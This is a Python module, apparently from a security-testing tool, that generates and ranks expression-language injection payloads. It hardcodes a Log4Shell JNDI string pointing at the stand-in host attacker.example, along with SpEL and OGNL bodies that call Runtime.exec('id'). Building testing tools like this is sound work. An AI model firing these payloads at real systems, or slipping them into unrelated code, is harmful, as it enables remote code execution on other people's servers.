"""Expression-language injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_el_context

# Cross-flavor bodies: SpEL, OGNL, and JNDI (Log4Shell).
_TEXT_BODIES = [
    ("${jndi:ldap://attacker.example/a}", "jndi-log4shell"),
    ("${7*7}", "el-probe"),
    ("#{T(java.lang.Runtime).getRuntime().exec('id')}", "spel-rce"),
    ("%{(#a=@java.lang.Runtime@getRuntime()).exec('id')}", "ognl-rce"),
]

_EXPRESSION_BODIES = [
    ("T(java.lang.Runtime).getRuntime().exec('id')", "spel-rce"),
    ("@java.lang.Runtime@getRuntime().exec('id')", "ognl-rce"),
    ("7*7", "probe"),
]

_STRING_BODIES = [
    ("'.concat(T(java.lang.Runtime).getRuntime().exec('id'))+'", "spel-concat"),
    ('".concat(T(java.lang.Runtime).getRuntime().exec("id"))+"', "spel-concat"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class ElCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class ElMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[ElCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    return {
        Context.EL_TEXT: _TEXT_BODIES,
        Context.EL_EXPRESSION: _EXPRESSION_BODIES,
        Context.EL_STRING: _STRING_BODIES,
    }.get(context, _TEXT_BODIES)


def mutate_el(template: str) -> ElMutationResult:
    """Generate and rank expression-language injection payloads for ``template``."""
    from .analyzer import analyze_el

    context = analyze_el_context(template)
    generated = _bodies(context)

    candidates: list[ElCandidate] = []
    for payload, strategy in generated:
        result = analyze_el(template, payload)
        b = result.breakout
        if b.command_injected or "jndi" in b.separators:
            candidates.append(
                ElCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=b.command_injected,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return ElMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
